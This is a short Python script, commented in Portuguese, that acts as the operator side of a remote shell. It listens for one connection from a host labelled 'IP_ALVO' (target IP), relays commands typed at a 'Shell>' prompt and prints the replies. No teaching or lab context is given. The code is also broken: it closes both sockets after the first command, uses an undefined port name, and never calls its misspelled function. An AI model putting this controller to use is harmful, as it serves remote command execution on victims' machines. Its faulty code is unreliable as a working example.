import socket

def inciar_servidor(server_ip, server_port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.bind((server_ip, server_port))

    server_socket.listen(1) #aceita até uma conexão
    print(f"Conexão de {server_ip}:{server_port}")

    client_socket, client_address = server_socket.accept()
    print(f"Conexão estabelecida {client_address}")

    while True: 
        command = input("Shell>")

        if command.lower() == "exit":
            client_socket.send("exit".encode())
            break
        client_socket.send(command.encode())
        resposta = client_socket.recv(4096).decode()
        print(resposta) 

        client_socket.close()
        server_socket.close()

server_ip = 'IP_ALVO'
server_port  = PORTA_SERVIDOR      
